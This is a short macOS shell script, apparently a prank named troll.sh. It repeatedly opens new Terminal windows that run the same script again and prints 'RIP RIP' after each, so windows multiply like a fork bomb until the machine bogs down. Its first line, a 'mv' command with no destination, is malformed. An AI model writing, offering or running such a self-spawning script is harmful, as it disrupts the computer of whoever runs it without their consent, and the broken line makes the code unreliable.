#!/bin/sh

mv ./troll.sh
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP
open -a Terminal . ~/Desktop/troll.sh
echo RIP RIP